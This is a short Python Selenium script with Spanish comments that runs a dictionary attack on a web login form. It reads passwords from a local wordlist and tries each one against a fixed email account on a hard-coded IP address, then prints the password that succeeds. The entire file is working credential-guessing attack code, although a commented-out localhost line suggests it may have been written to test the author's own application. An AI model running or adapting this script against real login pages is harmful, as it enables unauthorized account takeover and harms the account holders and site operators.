from selenium import webdriver
from selenium.webdriver.common.keys import Keys



# Configuración del navegador
driver = webdriver.Chrome()  # Asegúrate de tener el controlador del navegador instalado
url = "http://49.13.155.184:8081"
#url="http://localhost:4200"
driver.get(url)

# Localiza los campos de entrada y el botón en la página
email_input = driver.find_element("id", "email")
password_input = driver.find_element("id", "password")
login_button = driver.find_element("id", "bto_login")



#login_button = wait.until(EC.presence_of_element_located((By.id, "bto_login")))

# Ruta al archivo de contraseñas
archivo_contraseñas = ".\\password\\diccionario.txt"

# Lista para almacenar las contraseñas
contraseñas = []

# Leer contraseñas desde el archivo
with open(archivo_contraseñas, "r") as file:
    contraseñas = [line.strip() for line in file]

# Variable para indicar si se inició sesión
inicio_sesion_exitoso = False

# Ciclo para probar cada contraseña
for contraseña in contraseñas:
    email_input.clear()  # Limpiar el campo de correo electrónico
    password_input.clear()  # Limpiar el campo de contraseña

    email_input.send_keys("alex@email.com")
    password_input.send_keys(contraseña)

    # Envía el formulario haciendo clic en el botón de inicio de sesión
    login_button.click()

    # Puedes verificar si el inicio de sesión fue exitoso observando cambios en la página o verificando mensajes de error, etc.
    # En este ejemplo, asumimos que un cambio en la URL indica un inicio de sesión exitoso.
    if "pagina_de_inicio" in driver.current_url:
        inicio_sesion_exitoso = True
        print(f"Inicio de sesión exitoso. Contraseña utilizada: {contraseña}")
        break  # Detener el bucle si se inicia sesión correctamente

# Si no se inicia sesión correctamente
if not inicio_sesion_exitoso:
    print("No se pudo iniciar sesión con ninguna contraseña.")

# Cierra el navegador al final
driver.quit()
